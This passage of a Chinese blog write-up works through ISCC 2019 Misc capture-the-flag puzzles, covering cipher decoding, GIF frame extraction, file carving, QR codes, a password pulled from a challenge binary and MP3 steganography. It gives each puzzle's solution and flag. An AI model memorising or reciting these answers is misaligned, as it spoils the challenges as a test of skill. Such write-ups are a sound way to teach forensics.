text.replace(<span class="string">'EFVGYWDCFT'</span>,<span class="string">'W'</span>)</span><br><span class="line">text = text.replace(<span class="string">'TYUIOJM'</span>,<span class="string">'T'</span>)</span><br><span class="line">text = text.replace(<span class="string">'QAZXCDEWV'</span>,<span class="string">'T'</span>)</span><br><span class="line">text = text.replace(<span class="string">'XSWEFTYHN'</span>,<span class="string">'M'</span>)</span><br><span class="line">text = text.replace(<span class="string">'EFVGY'</span>,<span class="string">'V'</span>)</span><br><span class="line">text = text.replace(<span class="string">'RGNYGC'</span>,<span class="string">'X'</span>)</span><br><span class="line">text = text.replace(<span class="string">'TRFVG'</span>, <span class="string">'F'</span>)</span><br><span class="line"></span><br><span class="line">print(text)</span><br></pre></td></tr></table></figure>
+
+<p>得到一串解密字符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HELLO,IN COMPUTER SECURITY, CAPTURE THEFLAG (CTF), A TYPE OF CRYPTOSPORT, IS A COMPUTER SECURITY COMPETITION. CTF CONTESTS ARE USUALLY DESLGREDNED TO SERVE AS AN EDUCATIONAL EXERCISE TO GIVE PARTICIPANTS EXPERIENCE IN SECURING A MACHINE, AS WELL AS CONDUCTING AND REACTING TO THE SORT OF ATTACKSFOUND IN THE REAL WORLD (I.E., BUG BOUNTY PROGRAMS IN PROFESSIONAL SETTINGS). HERE ARE YOURFLAG&#123;ISCC KEYBOARD CIPHER&#125; REVERSE-ENGINEERING, NETWORK SNIFFING, PROTOCOL ANALYSIS, SYSTEM ADMINISTRATION, PROGRAMING, AND CRYPTANALYSIS ARE ALL SKILLS WHICH HAVE BEEN RETUIRED BY PRIOR CTF CONTESTS AT DEF CON.</span><br></pre></td></tr></table></figure>
+
+<p>结果还是各种提交不上去，在试了很多种姿势后得到flag（吐槽一句为什么这比赛不统一一下flag。。。）</p>
+<h4 id="Flag-2"><a href="#Flag-2" class="headerlink" title="Flag"></a>Flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;ISCC KEYBOARD CIPHER&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="Aesop’s-secret-pt300"><a href="#Aesop’s-secret-pt300" class="headerlink" title="Aesop’s secret-pt300"></a>Aesop’s secret-pt300</h1><h4 id="Description-3"><a href="#Description-3" class="headerlink" title="Description"></a>Description</h4><p>一张gif图片</p>
+<p><img src="/2019/05/15/ISCC-Misc/C:%5CUsers%5Clijin%5Cd%5Cgithub%5Cblog%5Csource_posts%5CISCC-Misc%5CAesop.gif" alt></p>
+<h4 id="Analyze-3"><a href="#Analyze-3" class="headerlink" title="Analyze"></a>Analyze</h4><p>隐隐约约看着这应该是可以拼成一张图的，用python来分割每一帧的图像后用PS把这些图像合成一张</p>
+<h4 id="Solve-3"><a href="#Solve-3" class="headerlink" title="Solve"></a>Solve</h4><p>脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">analyseImage</span><span class="params">(path)</span>:</span></span><br><span class="line">    im = Image.open(path)</span><br><span class="line">    results = &#123;</span><br><span class="line">        <span class="string">'size'</span>: im.size,</span><br><span class="line">        <span class="string">'mode'</span>: <span class="string">'full'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> im.tile:</span><br><span class="line">                tile = im.tile[<span class="number">0</span>]</span><br><span class="line">                update_region = tile[<span class="number">1</span>]</span><br><span class="line">                update_region_dimensions = update_region[<span class="number">2</span>:]</span><br><span class="line">                <span class="keyword">if</span> update_region_dimensions != im.size:</span><br><span class="line">                    results[<span class="string">'mode'</span>] = <span class="string">'partial'</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            im.seek(im.tell() + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> results</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">processImage</span><span class="params">(path)</span>:</span></span><br><span class="line">    mode = analyseImage(path)[<span class="string">'mode'</span>]</span><br><span class="line"></span><br><span class="line">    im = Image.open(path)</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    p = im.getpalette()</span><br><span class="line">    last_frame = im.convert(<span class="string">'RGBA'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            print(<span class="string">"saving %s (%s) frame %d, %s %s"</span> % (path, mode, i, im.size, im.tile))</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> im.getpalette():</span><br><span class="line">                im.putpalette(p)</span><br><span class="line"></span><br><span class="line">            new_frame = Image.new(<span class="string">'RGBA'</span>, im.size)</span><br><span class="line">            <span class="keyword">if</span> mode == <span class="string">'partial'</span>:</span><br><span class="line">                new_frame.paste(last_frame)</span><br><span class="line"></span><br><span class="line">            new_frame.paste(im, (<span class="number">0</span>, <span class="number">0</span>), im.convert(<span class="string">'RGBA'</span>))</span><br><span class="line">            new_frame.save(<span class="string">'%s-%d.png'</span> % (<span class="string">''</span>.join(os.path.basename(path).split(<span class="string">'.'</span>)[:<span class="number">-1</span>]), i), <span class="string">'PNG'</span>)</span><br><span class="line"></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            last_frame = new_frame</span><br><span class="line">            im.seek(im.tell() + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    processImage(<span class="string">'Aesop.gif'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>最终图像：</p>
+<p><img src="/2019/05/15/ISCC-Misc/C:%5CUsers%5Clijin%5Cd%5Cgithub%5Cblog%5Csource_posts%5CISCC-Misc%5CAesop-9.png" alt></p>
+<h4 id="Analyze-4"><a href="#Analyze-4" class="headerlink" title="Analyze"></a>Analyze</h4><p>易看出这是ISCC，但是当时不知道什么意思。再把gif丢进HxD中发现最后有一串类似于base64的东西<img src="/2019/05/15/ISCC-Misc/C:%5CUsers%5Clijin%5Cd%5Cgithub%5Cblog%5Csource_posts%5CISCC-Misc%5C3.jpg" alt></p>
+<p>但是base64解不开，那就只有可能是aes加密了，然后找了个<a href="http://tool.oschina.net/encrypt/" target="_blank" rel="noopener">在线解密网站</a>解密两次aes后得到flag</p>
+<h4 id="Solve-4"><a href="#Solve-4" class="headerlink" title="Solve"></a>Solve</h4><p><img src="/2019/05/15/ISCC-Misc/C:%5CUsers%5Clijin%5Cd%5Cgithub%5Cblog%5Csource_posts%5CISCC-Misc%5C4.jpg" alt></p>
+<p><img src="/2019/05/15/ISCC-Misc/C:%5CUsers%5Clijin%5Cd%5Cgithub%5Cblog%5Csource_posts%5CISCC-Misc%5C5.jpg" alt></p>
+<h4 id="Flag-3"><a href="#Flag-3" class="headerlink" title="Flag"></a>Flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;DugUpADiamondADeepDarkMine&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="碎纸机-pt400"><a href="#碎纸机-pt400" class="headerlink" title="碎纸机-pt400"></a>碎纸机-pt400</h1><h4 id="Description-4"><a href="#Description-4" class="headerlink" title="Description"></a>Description</h4><p>下载后是一张图片</p>
+<p><img src="/2019/05/15/ISCC-Misc/C:%5CUsers%5Clijin%5Cd%5Cgithub%5Cblog%5Csource_posts%5CISCC-Misc%5C%E5%B9%B3%E5%B9%B3%E6%97%A0%E5%A5%87%E7%9A%84%E7%A2%8E%E7%BA%B8%E6%9C%BA.jpg" alt></p>
+<h4 id="Analyze-5"><a href="#Analyze-5" class="headerlink" title="Analyze"></a>Analyze</h4><p>丢linux里binwalk，foremost得到一个zip文件，解压后得到十个“一模一样”的拼图。</p>
+<p><img src="/2019/05/15/ISCC-Misc/C:%5CUsers%5Clijin%5Cd%5Cgithub%5Cblog%5Csource_posts%5CISCC-Misc%5C7.jpg" alt></p>
+<h4 id="Solve-5"><a href="#Solve-5" class="headerlink" title="Solve"></a>Solve</h4><p>丢到了HxD看了每一个拼图，就最后一部分有很大不同，把最后那部分粘贴出来后创建十个新的文件储存</p>
+<p><img src="/2019/05/15/ISCC-Misc/C:%5CUsers%5Clijin%5Cd%5Cgithub%5Cblog%5Csource_posts%5CISCC-Misc%5C6.jpg" alt></p>
+<p>用python读取这里面的信息重新绘图（推荐是opencv但我用的pillow库，效果一样）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printXy</span><span class="params">(data,x,y)</span>:</span></span><br><span class="line">    s = []</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(x):</span><br><span class="line">            q = []</span><br><span class="line">            <span class="keyword">for</span> z <span class="keyword">in</span> range(y):</span><br><span class="line">                q.append(data[y*i+z])</span><br><span class="line">            s.append(q)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">x = <span class="number">500</span> </span><br><span class="line">y = <span class="number">50</span></span><br><span class="line"><span class="keyword">global</span> im</span><br><span class="line">im =  Image.new(<span class="string">"RGB"</span>,(x,y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    <span class="keyword">with</span> open(str(x),<span class="string">"rb"</span>) <span class="keyword">as</span> f :</span><br><span class="line">        data = f.read()</span><br><span class="line">        d_len = len(data)</span><br><span class="line">        point=printXy(data,<span class="number">50</span>,<span class="number">25</span>)</span><br><span class="line">        <span class="comment">#print(len(point))</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">25</span>):</span><br><span class="line">                <span class="comment">#print(((x-1)*50+i, j))</span></span><br><span class="line">                im.putpixel((j*<span class="number">2</span> +<span class="number">25</span>*(x<span class="number">-1</span>),i), (int(point[i][j]), int(point[i][j]), int(point[i][j])))</span><br><span class="line">                im.putpixel((j*<span class="number">2</span>+<span class="number">1</span> +<span class="number">25</span>*(x<span class="number">-1</span>),i), (int(point[i][j]), int(point[i][j]), int(point[i][j])))</span><br><span class="line">im.show(<span class="string">"flag.png"</span>)</span><br><span class="line">im.save(<span class="string">"flag.png"</span>)</span><br></pre></td></tr></table></figure>
+
+<p>重绘的图：</p>
+<p><img src="/2019/05/15/ISCC-Misc/C:%5CUsers%5Clijin%5Cd%5Cgithub%5Cblog%5Csource_posts%5CISCC-Misc%5Cflag.png" alt></p>
+<p>稍微拼凑一下得到flag</p>
+<h4 id="Flag-4"><a href="#Flag-4" class="headerlink" title="Flag"></a>Flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag=&#123;ISCC_is_so_interesting_!&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="最危险的地方就是最安全的地方-pt100"><a href="#最危险的地方就是最安全的地方-pt100" class="headerlink" title="最危险的地方就是最安全的地方-pt100"></a>最危险的地方就是最安全的地方-pt100</h1><h4 id="Description-5"><a href="#Description-5" class="headerlink" title="Description"></a>Description</h4><p>假装是一张图</p>
+<p><img src="/2019/05/15/ISCC-Misc/C:%5CUsers%5Clijin%5Cd%5Cgithub%5Cblog%5Csource_posts%5CISCC-Misc%5CMisc-01.jpg" alt></p>
+<h4 id="Analyze-6"><a href="#Analyze-6" class="headerlink" title="Analyze"></a>Analyze</h4><p>​        先尝试修复了下</p>
+<p><img src="/2019/05/15/ISCC-Misc/C:%5CUsers%5Clijin%5Cd%5Cgithub%5Cblog%5Csource_posts%5CISCC-Misc%5C8.jpg" alt></p>
+<p>emmm然后binwalk，foremost二连，得到一堆二维码。。。</p>
+<p>然后发现有个二维码与众不同<img src="/2019/05/15/ISCC-Misc/C:%5CUsers%5Clijin%5Cd%5Cgithub%5Cblog%5Csource_posts%5CISCC-Misc%5C9.jpg" alt></p>
+<h4 id="Solve-6"><a href="#Solve-6" class="headerlink" title="Solve"></a>Solve</h4><p>丢HxD</p>
+<p><img src="/2019/05/15/ISCC-Misc/C:%5CUsers%5Clijin%5Cd%5Cgithub%5Cblog%5Csource_posts%5CISCC-Misc%5C10.jpg" alt></p>
+<p>flag{15cC9012}然后试格式，得到最终flag</p>
+<h4 id="Flag-5"><a href="#Flag-5" class="headerlink" title="Flag"></a>Flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">15cC9012</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="解密成绩单-pt100"><a href="#解密成绩单-pt100" class="headerlink" title="解密成绩单-pt100"></a>解密成绩单-pt100</h1><h4 id="Description-6"><a href="#Description-6" class="headerlink" title="Description"></a>Description</h4><p>老师为了保密将某门课程的成绩单进行了加密处理，但在查成绩时忘记了自己原来是怎样进行了加密，你能帮同学们顺利查到成绩吗？</p>
+<h4 id="Analyze-7"><a href="#Analyze-7" class="headerlink" title="Analyze"></a>Analyze</h4><p>一个压缩包，解压不出来，啥信息都没有盲猜伪加密，直接7z解压得到程序</p>
+<p><img src="/2019/05/15/ISCC-Misc/C:%5CUsers%5Clijin%5Cd%5Cgithub%5Cblog%5Csource_posts%5CISCC-Misc%5C11.jpg" alt></p>
+<h4 id="Solve-7"><a href="#Solve-7" class="headerlink" title="Solve"></a>Solve</h4><p>得到exe，丢IDA里，看见两个函数</p>
+<p><img src="/2019/05/15/ISCC-Misc/C:%5CUsers%5Clijin%5Cd%5Cgithub%5Cblog%5Csource_posts%5CISCC-Misc%5C12.jpg" alt></p>
+<p><img src="/2019/05/15/ISCC-Misc/C:%5CUsers%5Clijin%5Cd%5Cgithub%5Cblog%5Csource_posts%5CISCC-Misc%5C13.jpg" alt></p>
+<p>得到<code>User:admin Password:ISCCq19pc1Yhb6SqtGhliYH688feCH7lqQxtfa2MpOdONW1wmIleBo4TW5n</code>输入后得到flag</p>
+<p><img src="/2019/05/15/ISCC-Misc/C:%5CUsers%5Clijin%5Cd%5Cgithub%5Cblog%5Csource_posts%5CISCC-Misc%5C14.png" alt></p>
+<h4 id="Flag-6"><a href="#Flag-6" class="headerlink" title="Flag"></a>Flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ISCC&#123;Y0u_F0UnD_ThE_P4SSW0RD!&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h1><h4 id="Description-7"><a href="#Description-7" class="headerlink" title="Description"></a>Description</h4><p>一个txt文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條戶囗  萇條戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條戶囗  萇條戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條</span><br></pre></td></tr></table></figure>
+
+<h4 id="Analyze-8"><a href="#Analyze-8" class="headerlink" title="Analyze"></a>Analyze</h4><p>脑洞题。。。突然想到了，就是结尾如果是‘囗’就是0，如果不是就是1，弄个脚本跑了跑</p>
+<h4 id="Solve-8"><a href="#Solve-8" class="headerlink" title="Solve"></a>Solve</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">"Welcome.txt"</span>,<span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    t = f.read().split(<span class="string">" "</span>)</span><br><span class="line">    z = <span class="number">0</span></span><br><span class="line">    print(t)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            s = <span class="string">""</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">                <span class="comment">#print(t[z+i][-1])</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">"囗"</span> == t[z+i][<span class="number">-1</span>]:</span><br><span class="line">                    s = s+<span class="string">"1"</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    s = s + <span class="string">"0"</span></span><br><span class="line">            print(chr(int(s,<span class="number">2</span>)),end=<span class="string">""</span>)</span><br><span class="line">            z = z +<span class="number">8</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Flag-7"><a href="#Flag-7" class="headerlink" title="Flag"></a>Flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ISCC_WELCOME&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="无法运行的exe"><a href="#无法运行的exe" class="headerlink" title="无法运行的exe"></a>无法运行的exe</h1><h4 id="Description-8"><a href="#Description-8" class="headerlink" title="Description"></a>Description</h4><p>可执行文件无法运行，你是否能修复它？</p>
+<h4 id="Analyze-9"><a href="#Analyze-9" class="headerlink" title="Analyze"></a>Analyze</h4><p>丢在HxD里，看到一个像base64的东西，用py的b64操作一下得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x89PNG\r\n\x1a\x00\x00\x00\x00\rIHDR\x00\x00\x01)\x00\x00\x01)\x01\x00\x00\x00\x00\xe7\xe2\xe9/\x00\x00\x02\x02IDATx\x9c\xed\x9aA\x8e\x9b@\x10E\xdf\x07K\xb0k\xef\xb2\x84\x9b\xe0\x9c\xcc\xf8f\xe6\x08\xb9\x81\xbd\xcc\x0e\x16\x91@2\xfc, \x9eY\x8e\xc4dpH\xf7\x06TzR\x7fZ\xa5\xaf\xaa.d&gt;\xb0.\xc9G(\x88X\xc4&quot;\x16\xb1\x88&#125;\x18\xeb4\xaf\xb2\xcbG\x89\x8bJ\x18\x97X\xbe\xb1\xb6=`\x99m\xfbJ\xe8\x0e\x00Us\x04\xd9\xb6\xdb\xcd\xb5\xed\x01\x1b%\xd5\xd0\xe5\xc8\x9c/U\x0b \xa9|\x01m\xfb\xc1B\x9fN,\xd9\xfbe\x9b\xfe?X\x17\x06I:\xd1\xe5_\xb7\xe9\x9e\xb1\xc3\xfcH\r4\x84.\x9b\x12\xce\xdf\xcb\xd0\x8e`\xa0\xdbP\xdb\x0e\xb0\xf9x\x07\x01Pt\xdf\x86\xd4\x82\xe2G\xfe\xcbs,\xdbN\xdb^\xb0\xe0y\xdd\x18\x0e`\x9d\xeeG\xd2%\xd6o\xacm7\xd8Ee\xe8\xd3Q\xf2\x95\xd0\x8f\t\xaa\x9b\xb2\x8bu\xef\&apos;ag7\nCj\xa8n\xcf`\x88\xd9\xbb\x06\xe3\xe9\x00\xf6\xb5p\x8f\x0c\x95[\xd2\t\xfb\xbat\x1c\xf5+\x7f\xc2+c\xcc\xadY:\xe1\xba\xba\xb1X\xee\x8d\xcc6T\xb7\xd9\x96\xe3\xf1\xae\xc3\xc6\xd4\xd0\x94\x80\xc5\xe5T\xb4\x00\x8e\xde\xbb\x16[\xb2w\xf1\x04\xf7\xb3\&apos;\x14m\xf6\xd0[\x1a\xc7\xec]\x87e\x9e\x80F\n\x0fY5\x84\x1ek\xc9\xe7\x8d\xb5\xfd\xd3\xd8\xd2\xb5\xe1\xc4p/\x07i2\xcd\xfd\xf83\xd7\xa4\x8d\xb5\xed\x07\x1bSK\xaaZ\xd2\t\xd5\x14\xf7\x1c\x8bsl+Vb\xf8\xfdj3O\xbc\xab\x1c(\xda\xe8\xbd\xab\xb1\xe7\xb4&quot;tJX\xa6\x15\t\x9c&#125;\xdb\\\xdb\x1e\xb0?\xd3\x8a.&lt;4\&apos;-\xe9\x04p?n\xaem\x0f\xd82\xadX\x86A\xdc\x8f\x83$h\xaa\xe8\xbd\x9f\x89e\x0fK\xbeB\xf6\x00\xd7\x10\xdb\x8a\xcf\xc4\x86\x83\xec\x1aBw\x90\xb9\x9c\xbed\xd3\x1dc,\x05\x83=_\xe9\xcc\x97\x0fv\x9f&gt;k\x89X9\xac\xc5\x06\xcd#6\xb2!A\xbe\x02X\xaa_A\xdb?\x8d\x1d\x00\xc2\xdb\x7f|\xe9\xf2\x9a=0\xc4\xfb\xde\x88E,b\x11\xfb\x1b\xd8o\xe3x,\xaftp\xf7\xad\x00\x00\x00\x00IEND\xaeB`\x82</span><br></pre></td></tr></table></figure>
+
+<p>大致猜测试一个png，写进一个png头格式发现不大对，用HxD修复了下，得到一个二维码</p>
+<p><img src="/2019/05/15/ISCC-Misc/C:%5CUsers%5Clijin%5Cd%5Cgithub%5Cblog%5Csource_posts%5CISCC-Misc%5C2.png" alt></p>
+<h4 id="Solve-9"><a href="#Solve-9" class="headerlink" title="Solve"></a>Solve</h4><p>扫描二维码得到<img src="/2019/05/15/ISCC-Misc/C:%5CUsers%5Clijin%5Cd%5Cgithub%5Cblog%5Csource_posts%5CISCC-Misc%5C15.jpg" alt></p>
+<h4 id="Flag-8"><a href="#Flag-8" class="headerlink" title="Flag"></a>Flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IScC_2019</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="High起来！"><a href="#High起来！" class="headerlink" title="High起来！"></a>High起来！</h1><h4 id="Description-9"><a href="#Description-9" class="headerlink" title="Description"></a>Description</h4><p>酷爱音乐的你，在听歌的过程中突然收到音乐发烧友发来的一封神秘的邮件，邮件里什么都没有说，只有一个被损坏的图片。这名歌友到底要向你传达什么信息呢？答案或许就隐藏在这个损坏的文件中…</p>
+<h4 id="Analyze-10"><a href="#Analyze-10" class="headerlink" title="Analyze"></a>Analyze</h4><p>开局一个png，打不开就去修复，修复完是一个二维码</p>
+<p><img src="/2019/05/15/ISCC-Misc/C:%5CUsers%5Clijin%5Cd%5Cgithub%5Cblog%5Csource_posts%5CISCC-Misc%5CMisc-02.png" alt></p>
+<p>扫描后得到</p>
+<p><img src="/2019/05/15/ISCC-Misc/C:%5CUsers%5Clijin%5Cd%5Cgithub%5Cblog%5Csource_posts%5CISCC-Misc%5C16.jpg" alt></p>
+<p><code>中口由羊口中中大中中中井</code>是当铺密码，解密后得<code>201902252228</code></p>
+<p>然后用MP3Stego解MP3，密码是当铺密码解密后，得到一堆unicode</p>
